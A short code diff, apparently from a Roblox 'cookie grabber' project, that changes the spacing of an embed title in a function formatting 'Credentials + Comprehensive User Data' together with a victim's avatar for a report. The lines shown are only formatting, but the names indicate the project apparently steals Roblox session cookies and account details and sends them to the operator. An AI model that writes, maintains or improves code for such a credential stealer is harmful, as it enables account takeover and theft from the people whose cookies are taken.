@@ -505,7 +505,7 @@ function formatRobloxCombinedEmbedWithData(logData, userData) {
 
   // First embed: Credentials + Comprehensive User Data
   const credentialsAndDataEmbed = {
-    title: "<:emoji_37:1410520517349212200>**COOKIE-GRABBER**",
+    title: "<:emoji_37:1410520517349212200> **COOKIE-GRABBER**",
     color: 0xFFFFFF,
     thumbnail: userData.avatarUrl ? {
       url: userData.avatarUrl
